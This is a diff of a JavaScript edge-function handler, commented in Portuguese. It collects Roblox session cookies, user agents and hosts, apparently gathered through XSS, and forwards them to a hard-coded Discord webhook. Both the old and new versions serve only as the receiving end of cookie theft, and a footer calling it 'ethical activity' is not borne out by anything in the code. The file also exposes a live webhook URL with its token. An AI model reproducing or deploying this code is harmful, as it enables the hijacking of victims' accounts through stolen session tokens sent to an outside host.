@@ -1,49 +1,57 @@
-export const config = { runtime: "edge" };
+export const config = {
+  runtime: "edge",
+};
 
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";
 
-async function sendToWebhook(dataList) {
-  // dataList é array de objetos com cookie, userAgent, host e opcional title
-  const embeds = dataList.map(d => ({
-    title: d.title || "Cookie Capturado - Roblox",
-    color: 15158332, // vermelho padrão do Discord
-    fields: [
-      { name: "Cookie", value: `\`\`\`${(d.cookie || "Não enviado").slice(0, 1024)}\`\`\``, inline: false },
-      { name: "User Agent", value: `\`\`\`${(d.userAgent || "Não enviado").slice(0, 1024)}\`\`\``, inline: false },
-      { name: "Host", value: d.host || "Desconhecido", inline: true },
-      { name: "Timestamp", value: new Date().toISOString(), inline: true },
-    ],
-  }));
-
-  const payload = { embeds }; // CORRETO: embeds no plural
-
-  const res = await fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload),
-  });
-
-  if (!res.ok) throw new Error(`Erro ao enviar webhook: ${await res.text()}`);
-
-  return true;
-}
-
 export default async function handler(req) {
+  if (req.method !== "POST") {
+    return new Response("Método não permitido", { status: 405 });
+  }
+
   try {
-    if (req.method !== "POST") {
-      return new Response("Use método POST com JSON", { status: 405 });
-    }
-
     const body = await req.json();
+    const data = body.data || [];
 
-    if (!body.data || !Array.isArray(body.data)) {
-      return new Response("JSON inválido, envie { data: [...] }", { status: 400 });
+    if (!Array.isArray(data) || data.length === 0) {
+      return new Response("Nenhum dado para enviar", { status: 400 });
     }
 
-    await sendToWebhook(body.data);
+    // Construir campos do embed com os dados recebidos
+    const fields = data.map((item, i) => ({
+      name: `Dado ${i + 1}`,
+      value: [
+        `Cookie: \`${item.cookie || "Não enviado"}\``,
+        `User Agent: \`${item.userAgent || "Não enviado"}\``,
+        `Host: \`${item.host || "Não enviado"}\``,
+      ].join("\n"),
+      inline: false,
+    }));
 
-    return new Response("Dados enviados com sucesso!", { status: 200 });
-  } catch (error) {
-    return new Response(`Erro interno: ${error.message}`, { status: 500 });
+    const payload = {
+      embeds: [
+        {
+          title: "Dados Recebidos - Roblox XSS",
+          color: 0xff0000,
+          fields,
+          timestamp: new Date().toISOString(),
+          footer: { text: "Atividade Ética - Envio via API" },
+        },
+      ],
+    };
+
+    const response = await fetch(WEBHOOK_URL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+    });
+
+    if (!response.ok) {
+      return new Response("Erro ao enviar webhook", { status: 500 });
+    }
+
+    return new Response("Enviado com sucesso!", { status: 200 });
+  } catch (err) {
+    return new Response("Erro no servidor: " + err.message, { status: 500 });
   }
 }
